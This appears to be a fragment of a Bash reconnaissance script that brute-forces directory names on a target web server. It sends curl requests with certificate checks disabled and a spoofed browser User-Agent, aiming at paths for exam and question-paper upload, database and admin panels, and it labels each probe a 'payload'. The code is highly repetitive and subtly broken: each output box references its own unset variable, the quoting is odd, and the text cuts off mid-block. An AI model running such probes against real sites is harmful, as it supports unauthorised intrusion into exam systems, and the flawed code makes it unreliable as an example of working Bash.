echo -n "Payload ["QPBatch-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
